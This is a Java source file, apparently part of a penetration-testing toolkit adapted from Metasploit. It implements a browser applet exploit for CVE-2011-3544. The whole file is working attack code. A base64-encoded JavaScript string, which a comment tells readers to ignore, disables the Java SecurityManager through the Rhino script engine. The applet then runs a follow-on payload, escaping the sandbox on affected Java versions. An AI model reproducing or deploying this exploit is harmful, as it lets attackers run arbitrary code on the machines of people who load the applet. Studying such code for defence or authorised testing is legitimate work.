/*
 * (c) 2012 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * Exploit for CVE-2011-3544
 *
 * Metasploit Framework module: multi/browser/java_rhino
 *
 * Adapted from the BSD licensed Metasploit Framework at:
 * /opt/metasploit/msf3/external/source/exploits/CVE-2011-3544
 */
import javax.script.*;
import javax.swing.*;
import java.util.*;
import java.applet.*;

/* use the java_rhino loophole to disable the Java security sandbox
 * Affected Java versions:
 *	Java 1.7.0_0
 *	Java 1.6.0_27 and earlier
 */
public class Rhino extends Main {
	public Rhino(Applet ap) {
		super(ap);
	}

	public void next() {
		new Thread(this).start();
	}

	public void check() {
		try {
			ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
			Bindings b = engine.createBindings();
			b.put("applet", this);

			// Disable SecurityManager, and then run the payload
			// The error object isn't handled by Rhino, so the toString method
			// will not be restricted by access control
			Object proxy = (Object) engine.eval(new String(Base64.decode(
				//
				// this string is base64 encoded JavaScript... pay it little to no mind.
				//
				"dGhpcy50b1N0cmluZyA9IGZ1bmN0aW9uKCkgew0KICAgamF2YS5sYW5nLlN5c3RlbS5zZXRTZWN1cml0eU1hbmFnZXIobnVsbCk7DQogICBhcHBsZXQubmV4dCgpOw0KICAgcmV0dXJuICdsb2FkaW5nJzsNCn07DQoNCmUgPSBuZXcgRXJyb3IoKTsNCmUubWVzc2FnZSA9IHRoaXM7DQpl"
				), "UTF-8"), b);

			JList list = new JList(new Object[] { proxy });
			applet.add(list);
		}
		catch (Exception ex) {
			ex.printStackTrace();
		}
	}
}
